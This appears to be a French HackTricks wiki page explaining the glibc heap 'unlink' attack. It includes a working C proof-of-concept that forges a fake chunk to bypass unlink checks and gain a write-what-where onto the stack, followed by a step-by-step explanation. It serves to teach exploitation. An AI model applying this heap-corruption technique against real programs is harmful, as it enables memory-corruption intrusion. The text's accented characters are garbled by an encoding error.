# Attaque Unlink

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de Base

Lorsque cette attaque a √©t√© d√©couverte, elle permettait principalement un WWW (Write What Where), cependant, quelques **v√©rifications ont √©t√© ajout√©es** rendant la nouvelle version de l'attaque plus int√©ressante mais plus complexe et **inutile**.

### Exemple de Code:

<details>

<summary>Code</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* L'attaque ne fonctionne pas si les tcaches sont utilis√©s

### Objectif

* Modifier un pointeur vers un chunk dans la pile pour qu'il pointe vers la pile afin de pouvoir modifier le contenu de la pile en √©crivant dans le chunk

### Exigences

* Un certain contr√¥le dans une m√©moire (par exemple, la pile) pour cr√©er quelques chunks en donnant des valeurs √† certains des attributs.
* Fuite de pile afin de d√©finir les pointeurs du faux chunk.

### Attaque

* Il y a quelques chunks (chunk1 et chunk2)
* L'attaquant contr√¥le le contenu de chunk1 et les en-t√™tes de chunk2.
* Dans chunk1, l'attaquant cr√©e la structure d'un faux chunk:
* Pour contourner les protections, il s'assure que le champ `size` est correct pour √©viter l'erreur : `corrupted size vs. prev_size while consolidating`
* et les champs `fd` et `bk` du faux chunk pointent l√† o√π le pointeur du chunk1 est stock√© avec des d√©calages de -3 et -2 respectivement afin que `fake_chunk->fd->bk` et `fake_chunk->bk->fd` pointent vers la position en m√©moire (pile) o√π se trouve l'adresse r√©elle du chunk1 :

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Les en-t√™tes du chunk2 sont modifi√©s pour indiquer que le chunk pr√©c√©dent n'est pas utilis√© et que la taille est la taille du faux chunk contenu.
* Lorsque le deuxi√®me chunk est lib√©r√©, alors ce faux chunk est d√©sencha√Æn√© se produisant :
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Auparavant, il a √©t√© fait en sorte que `fake_chunk->fd->bk` et `fake_chunk->fd->bk` pointent vers le m√™me endroit (l'emplacement dans la pile o√π `chunk1` √©tait stock√©, donc c'√©tait une liste cha√Æn√©e valide). Comme **les deux pointent vers le m√™me emplacement**, seul le dernier (`fake_chunk->bk->fd = fake_chunk->fd`) aura **effet**.
* Cela va **√©craser le pointeur vers chunk1 dans la pile √† l'adresse (ou octets) stock√©e 3 adresses avant dans la pile**.
* Par cons√©quent, si un attaquant pouvait contr√¥ler √† nouveau le contenu du chunk1, il serait capable d'**√©crire dans la pile** en mesure de potentiellement √©craser l'adresse de retour en sautant le canary et de modifier les valeurs et les points des variables locales. M√™me en modifiant √† nouveau l'adresse de chunk1 stock√©e dans la pile vers un emplacement diff√©rent o√π si l'attaquant pouvait contr√¥ler √† nouveau le contenu de chunk1, il serait capable d'√©crire n'importe o√π.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## R√©f√©rences

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
